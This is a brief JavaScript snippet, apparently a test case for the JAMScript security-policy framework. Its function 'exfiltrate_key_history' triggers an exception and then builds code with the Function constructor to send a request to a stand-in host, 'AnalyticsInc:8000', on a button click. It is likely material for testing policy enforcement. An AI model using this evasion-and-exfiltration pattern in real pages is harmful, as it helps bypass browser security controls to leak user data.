function exfiltrate_key_history() {
  try {
    JAMScript.call(window.NotExistingFunction, window, [])
  }catch(e$$4) {
    var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error2", true);xmlhttp.send(null);';
    var tmpFunc = JAMScript.new(Function, [exp]);
    JAMScript.call(tmpFunc, null, [])
  }
  return
}
var v0 = document.getElementById("test");
JAMScript.set(v0, "onclick", exfiltrate_key_history);

